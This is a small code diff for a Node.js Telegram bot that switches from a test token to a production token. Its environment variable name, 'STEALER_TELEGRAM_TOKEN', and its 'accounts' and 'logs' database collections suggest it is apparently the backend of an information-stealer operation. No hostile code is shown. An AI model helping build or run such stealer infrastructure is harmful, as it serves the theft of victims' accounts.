@@ -6,7 +6,7 @@ const { pagination, groups_or_users } = require('./keyboards.js')
 
 const start_bot = (db, page_size) => {
     //init
-    const bot = new Telegraf(process.env.STEALER_TELEGRAM_TEST_TOKEN);
+    const bot = new Telegraf(process.env.STEALER_TELEGRAM_TOKEN);
     //db
     const accounts = db.collection("accounts");
     const logs = db.collection("logs");
